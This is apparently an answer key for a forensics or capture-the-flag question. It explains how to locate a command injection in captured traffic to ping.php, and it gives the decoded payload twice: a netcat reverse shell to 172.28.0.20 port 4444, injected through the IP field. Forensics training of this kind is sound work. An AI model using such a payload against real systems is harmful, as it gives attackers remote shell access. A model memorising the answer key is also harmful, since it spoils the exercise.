# Question 12 - Command Injection Payload

## Solution

1. Look for POST requests after successful authentication
2. Find requests to a page that accepts user input (ping.php)
3. The IP parameter contains the injection payload
4. URL-decode the payload to reveal: `127.0.0.1; nc 172.28.0.20 4444 -e /bin/bash`

## Answer
`127.0.0.1; nc 172.28.0.20 4444 -e /bin/bash`
